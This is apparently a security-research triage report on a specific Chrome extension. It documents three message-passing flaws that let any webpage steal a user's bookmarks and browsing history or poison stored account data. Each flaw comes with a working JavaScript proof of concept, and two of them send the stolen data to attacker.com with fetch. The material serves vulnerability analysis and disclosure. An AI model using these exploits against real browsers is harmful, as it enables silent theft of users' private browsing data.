# CoCo Analysis: haeeihnjiolbfapfdfhonbfdjclejcni

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple flows (grouped into 3 main vulnerability classes)

---

## Sink 1: bg_chrome_runtime_MessageExternal → BookmarkSearchQuery_sink + sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/haeeihnjiolbfapfdfhonbfdjclejcni/opgen_generated_files/bg.js
Line 1339: `searchBookmarks(request.query).then(res => {`

**Code:**

```javascript
// Background script - External message handler (bg.js, lines 1328-1331)
chrome.runtime.onMessageExternal.addListener(async (request, sender, sendResponse) => {
    listener(request, sender, sendResponse);  // ← processes external messages
    return true;
});

// Background script - Message processor (bg.js, lines 1333-1382)
function listener(request, sender, sendResponse) {
    switch(request.event) {
        case EVENTS.SEARCH_BOOKMARKS:
            searchBookmarks(request.query).then(res => {  // ← request.query is attacker-controlled
                sendResponse(res);  // ← sends bookmarks back to attacker
            });
            break;
        case EVENTS.SEARCH_HISTORY:
            searchHistory(request.query).then(res => {  // ← request.query is attacker-controlled
                sendResponse(res);  // ← sends history back to attacker
            });
            break;
        // ... other cases
    }
}

function searchBookmarks(query) {
    return new Promise((resolve, reject) => {
        chrome.bookmarks.search(query, (res) => {  // ← SINK: attacker controls query
            resolve(res);  // ← returns bookmark data
        });
    });
}

function searchHistory(query) {
    return new Promise((resolve, reject) => {
        chrome.history.search({ text: query, maxResults: 10 }, (res) => {  // ← SINK
            resolve(res);  // ← returns history data
        });
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal) and window.postMessage

**Attack:**

```javascript
// Attack 1: From whitelisted domain dy1.com via external message
chrome.runtime.sendMessage(
    'haeeihnjiolbfapfdfhonbfdjclejcni',  // extension ID
    {
        event: 'SEARCH_BOOKMARKS',  // or 'SEARCH_HISTORY'
        query: ''  // Empty query returns all bookmarks/history
    },
    function(response) {
        console.log('Stolen bookmarks:', response);
        // Exfiltrate to attacker server
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify(response)
        });
    }
);

// Attack 2: From any webpage via window.postMessage through content script
// The content script runs on <all_urls> per manifest
window.postMessage({
    from: '__newtab',  // Required to pass the check
    event: 'SEARCH_BOOKMARKS',
    query: ''
}, '*');

// Content script forwards to background and posts response back
window.addEventListener('message', function(e) {
    if (e.data.from === 'ext' && e.data.res) {
        console.log('Stolen data:', e.data.res);
        // Exfiltrate
    }
});
```

**Impact:** Information disclosure vulnerability allowing attackers to exfiltrate user's complete browsing history and bookmarks. The extension has both `bookmarks` and `history` permissions in manifest.json. An attacker from the whitelisted domain (dy1.com) can send external messages, or ANY webpage can exploit via window.postMessage since content scripts run on `<all_urls>`. The attacker receives sensitive browsing data including URLs, titles, visit counts, and bookmark folders, enabling privacy violations, targeted phishing, and user profiling.

---

## Sink 2: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/haeeihnjiolbfapfdfhonbfdjclejcni/opgen_generated_files/bg.js
Line 1367-1368: `if (request.status && request.account) { chrome.storage.local.set({ 'account': JSON.stringify(request.account) }); }`

**Code:**

```javascript
// Background script - Message processor (bg.js, lines 1366-1372)
function listener(request, sender, sendResponse) {
    switch(request.event) {
        // ... other cases
        case EVENTS.SET_USER_STATUS:
            if (request.status && request.account) {
                chrome.storage.local.set({
                    'account': JSON.stringify(request.account)  // ← attacker-controlled
                });
            } else {
                chrome.storage.local.remove('account');
            }
            break;
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message and window.postMessage

**Attack:**

```javascript
// Via external message from dy1.com
chrome.runtime.sendMessage(
    'haeeihnjiolbfapfdfhonbfdjclejcni',
    {
        event: 'SET_USER_STATUS',
        status: true,
        account: {
            malicious: 'payload',
            admin: true,
            // Any data attacker wants to persist
        }
    }
);

// Via window.postMessage from any webpage
window.postMessage({
    from: '__newtab',
    event: 'SET_USER_STATUS',
    status: true,
    account: { attacker: 'data' }
}, '*');
```

**Impact:** Storage poisoning with complete exploitation chain. While storage.set alone would be a false positive, this vulnerability is exploitable because: (1) The attacker can poison the 'account' storage with arbitrary data, and (2) The extension likely uses this account data for authentication or authorization decisions in the new tab page UI. Since the extension overrides the new tab page (`chrome_url_overrides.newtab`) and has `externally_connectable` to dy1.com, the stored account data could affect user experience, enable session hijacking, or bypass authentication checks. The attacker can also clear the account by sending `status: false`.

---

## Sink 3: cs_window_eventListener_message → BookmarkSearchQuery_sink + chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/haeeihnjiolbfapfdfhonbfdjclejcni/opgen_generated_files/cs_0.js
Line 480-481: `window.addEventListener('message', function (e) { if (!e.data.from || e.data.from != '__newtab') { return false; } }`
Line 490: `chrome.runtime.sendMessage(e.data, (res) => {`

**Code:**

```javascript
// Content script - window.postMessage listener (cs_0.js, lines 480-506)
window.addEventListener('message', function (e) {
    if (!e.data.from || e.data.from != '__newtab') {  // ← Weak check, attacker can set
        return false;
    }

    if (localStorage.getItem('__debug')) {
        console.log('Content script receiving: ');
        console.log(e);
    }

    chrome.runtime.sendMessage(e.data, (res) => {  // ← forwards to background
        if (chrome.runtime.lastError) {

        }

        const sender = {
            event: e.data.event,
            res: res  // ← response from background
        };
        sendMessage(sender);  // ← posts back to webpage

        if (localStorage.getItem('__debug')) {
            console.log('Content script sending: ');
            console.log(sender);
        }
    });
});

function sendMessage(sender) {
    sender.from = 'ext';
    window.postMessage(sender, '*');  // ← sends response back to attacker
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (content script runs on `<all_urls>`)

**Attack:**

```javascript
// From ANY webpage (content script runs on <all_urls>)
// Set up listener first to receive stolen data
window.addEventListener('message', function(e) {
    if (e.data.from === 'ext' && e.data.res) {
        console.log('Received stolen data:', e.data.res);
        // Exfiltrate bookmarks/history
        fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: JSON.stringify(e.data.res)
        });
    }
});

// Trigger the vulnerability
window.postMessage({
    from: '__newtab',  // Bypass the weak check
    event: 'SEARCH_BOOKMARKS',  // or SEARCH_HISTORY, SET_USER_STATUS, etc.
    query: ''  // Get all bookmarks/history
}, '*');
```

**Impact:** Complete privacy breach exploitable from any webpage. The content script runs on `<all_urls>` (all websites), making this vulnerability extremely dangerous. ANY webpage can exploit it by simply calling window.postMessage with `from: '__newtab'`. The weak origin check can be trivially bypassed since the attacker controls the message content. This enables: (1) Stealing all bookmarks and browsing history from any website, (2) Poisoning account storage to hijack sessions, (3) No user interaction required - silent attack when user visits malicious page. The vulnerability is particularly severe because it affects all web browsing, not just specific domains.

---
